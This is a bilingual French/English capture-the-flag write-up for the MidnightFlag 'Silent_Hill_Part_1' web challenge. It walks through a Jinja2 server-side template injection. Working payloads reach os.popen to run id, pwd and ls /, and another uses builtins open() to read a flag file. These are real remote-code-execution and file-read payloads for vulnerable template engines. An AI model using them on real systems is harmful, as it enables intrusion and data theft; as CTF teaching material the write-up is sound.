---
title: Silent_Hill_Part_1 - FR - French | EN - english
author: cotes
date: 2024-05-03 00:34:00 +0800
categories: [write-up, MidnightFlag Backslash]
tags: [MidnightFlag Backslash, write-up]
---
'EN - English' at the end of 'FR - French version'

<a href="https://github.com/Kuorashi/file_challenge_ctf/tree/main/MidnightFlag%20Backslash/Silent_Hill_Part_1.zip" class="download-button">Download the zip of this challenge</a>

# FR - French

## Vérification de la faille :
Vérification de la SSTI ; si le code est exécuté, le site affichera 49 :
```
{{7*7}}
```
Le code s'étant bien exécuté, on peut poursuivre.

## Exploitation de la faille
En recherchant des *payloads* pour exploiter ce type de faille, on en trouve un parfait pour ce que l'on veut faire :
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

On situe notre emplacement sur le serveur avec :
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read() }}
```

On effectue un `ls` sur la racine pour trouver quelque chose d'intéressant :
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
```
Découverte du dossier `/lakeviewhotel_secrets`.

`ls` sur le dossier `/lakeviewhotel_secrets` :
découverte du fichier `flag.txt`.

Lecture du fichier `flag.txt` :
```
{{ get_flashed_messages.__globals__.__builtins__.open("/lakeviewhotel_secrets/flag.txt").read() }}
```

____________________________________________________________________________________________________________________________

# EN - English

## Vulnerability Verification:
Verification of SSTI; if the code executes, the site will display 49:
```
{{7*7}}
```
As the code has executed correctly, we can proceed.

## Exploit of the Vulnerability
While searching for payloads to exploit this type of vulnerability, we find one perfect for our needs:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

We locate our position on the server with:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('pwd').read() }}
```

We run `ls` on the root directory to find something interesting:
```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls /').read() }}
```
Discovery of the folder `lakeviewhotel_secrets`.

`ls` on the `lakeviewhotel_secrets` folder:
discovery of the file `flag.txt`.

Reading the file `flag.txt`:
```
{{ get_flashed_messages.__globals__.__builtins__.open("/lakeviewhotel_secrets/flag.txt").read() }}
```
